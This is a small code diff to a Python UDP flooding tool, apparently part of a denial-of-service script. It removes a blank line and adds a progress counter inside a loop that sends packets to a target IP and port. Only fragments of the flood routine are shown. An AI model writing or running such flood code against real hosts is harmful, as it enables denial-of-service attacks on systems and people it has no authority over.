@@ -6,7 +6,6 @@
 
 import socket
 import random
-
 from termcolor import colored
 from Helper_Classes.ArgumentMaker import progress_print
 
@@ -28,6 +27,7 @@ def UDPFlood(IP, port, pckt_size=1024, pckt_quantity=20):
             sckt.sendto(pckt, (IP, port))
             print(colored(f"\rSending {progress_print(fase)} | {percentage}%  -> On -> {IP}:{port} ", "green"),
                   end="")
+            fase += 1
     except Exception as e:
         print(colored(f"Error during UDP flood: {e}","red"))
     finally:
